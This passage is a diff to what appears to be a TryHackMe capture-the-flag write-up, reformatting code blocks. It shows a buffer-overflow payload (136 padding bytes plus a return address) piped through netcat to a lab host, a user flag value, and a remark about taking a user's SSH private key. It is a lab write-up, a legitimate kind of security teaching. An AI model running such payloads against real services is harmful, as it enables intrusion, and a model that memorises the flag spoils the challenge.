@@ -339,13 +339,18 @@ lets dig in :
 ![Image]({{ site.baseurl }}/images/obscure/33.png)
 
 **payload:** 
-``` (python2 -c 'print "A"*136 + "G\x06@\x00\x00\x00\x00\x00"'; cat) | nc 172.17.0.1 4444 ```
+```bash 
+(python2 -c 'print "A"*136 + "G\x06@\x00\x00\x00\x00\x00"'; cat) | nc 172.17.0.1 4444 
+```
 
 ![Image]({{ site.baseurl }}/images/obscure/34.png)
 
 ## USER FLAG :
 
-**USER FLAG:** ``` THM{43b0b68ba2755dd6cac3b8bf5454db94} ```
+**USER FLAG:** 
+```text
+THM{43b0b68ba2755dd6cac3b8bf5454db94} 
+```
 
 we can donwload the id_rsa of the user **zeeshan** to log in using ssh :
 
